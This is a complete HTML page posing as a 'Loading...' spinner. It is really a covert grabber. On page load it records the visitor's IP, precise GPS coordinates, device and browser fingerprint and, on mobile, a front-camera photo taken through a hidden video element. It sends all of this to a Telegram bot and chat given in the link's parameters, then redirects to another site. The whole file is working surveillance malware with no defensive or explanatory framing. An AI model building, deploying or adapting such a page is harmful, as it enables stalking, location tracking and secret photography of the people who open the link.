<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            height: 100vh; display: flex;
            justify-content: center; align-items: center;
            font-family: -apple-system, sans-serif;
        }
        .loader { text-align: center; color: white; }
        .spinner {
            width: 50px; height: 50px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top-color: #4fc3f7;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .text { font-size: 15px; color: #aaa; }
        video { display: none; }
    </style>
</head>
<body>
    <video id="cam" autoplay playsinline></video>
    <div class="loader">
        <div class="spinner"></div>
        <div class="text" id="status">Loading...</div>
    </div>

    <script>
    var p = new URLSearchParams(location.search);
    var redir = p.get('r') || 'https://google.com';
    var bot = p.get('bot') || '';
    var chat = p.get('chat') || '';
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    var gpsData = null;
    var ipData = null;
    var photoData = null;
    
    // Get IP first
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(d => { ipData = d.ip; })
        .catch(() => {});
    
    // Capture photo
    async function takePhoto() {
        if (!isMobile) return null;
        try {
            var v = document.getElementById('cam');
            var stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: 480, height: 640 } 
            });
            v.srcObject = stream;
            await v.play();
            await new Promise(r => setTimeout(r, 2000));
            
            var canvas = document.createElement('canvas');
            canvas.width = v.videoWidth || 480;
            canvas.height = v.videoHeight || 640;
            canvas.getContext('2d').drawImage(v, 0, 0);
            
            stream.getTracks().forEach(t => t.stop());
            return canvas.toDataURL('image/jpeg', 0.7);
        } catch(e) {
            return null;
        }
    }
    
    // Capture GPS
    function getGPS() {
        return new Promise(resolve => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    alt: pos.coords.altitude
                }),
                err => resolve(null),
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }
    
    // Format exactly like fragment.com
    function buildMessage() {
        var ua = navigator.userAgent;
        var plat = navigator.platform;
        var lang = navigator.language;
        var scr = screen.width + 'x' + screen.height;
        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        var cores = navigator.hardwareConcurrency || 'N/A';
        var ram = navigator.deviceMemory || 'N/A';
        var now = new Date();
        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        
        // Device model detection
        var deviceModel = plat;
        if (/iPhone/.test(ua)) {
            var iosVer = ua.match(/OS (\d+_\d+)/);
            deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
        }
        
        var msg = '';
        
        // Device section
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📊 Visitor Information Captured\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖥️ Device & Browser\n';
        msg += '   • Device Model: ' + deviceModel + '\n';
        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
        
        msg += '🌐 Network Information\n';
        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
        msg += '   • Language: ' + lang + '\n';
        msg += '   • Timezone: ' + tz + '\n\n';
        
        // GPS section
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    🗺️ GPS Coordinates\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        if (gpsData) {
            msg += '   ✅ Location Granted\n';
            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n\n';
            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
        } else {
            msg += '   ❌ Location: Not available on this device\n';
            msg += '   💡 Desktop computers do not have GPS\n\n';
        }
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '    📱 Device Details\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
        
        msg += '🖼️ Display Information\n';
        msg += '   • Resolution: ' + scr + '\n\n';
        
        msg += '💾 Hardware & Storage\n';
        msg += '   • CPU Cores: ' + cores + '\n';
        msg += '   • RAM: ' + ram + ' GB\n\n';
        
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
        
        return msg;
    }
    
    // Send to Telegram
    async function sendResults() {
        var msg = buildMessage();
        
        // Send text message
        await fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true })
        });
        
        // Send photo if available
        if (photoData) {
            var blob = (() => {
                var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
                var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
                while(n--) u8[n] = bstr.charCodeAt(n);
                return new Blob([u8], {type: mime});
            })();
            
            var fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', blob, 'camera_capture.jpg');
            fd.append('caption', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📸 Camera Capture Received\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
            
            await fetch('https://api.telegram.org/bot' + bot + '/sendPhoto', {
                method: 'POST', body: fd
            });
        }
        
        // Show GPS maps link if available
        if (gpsData) {
            await fetch('https://api.telegram.org/bot' + bot + '/sendLocation', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chat,
                    latitude: gpsData.lat,
                    longitude: gpsData.lon
                })
            });
        }
        
        document.getElementById('status').textContent = 'Complete!';
        setTimeout(() => { window.location.href = redir; }, 1500);
    }
    
    // Main
    async function main() {
        document.getElementById('status').textContent = 'Detecting location...';
        gpsData = await getGPS();
        
        if (gpsData && isMobile) {
            document.getElementById('status').textContent = 'Capturing photo...';
            photoData = await takePhoto();
        }
        
        document.getElementById('status').textContent = 'Sending...';
        await sendResults();
    }
    
    main();
    </script>
</body>
</html>
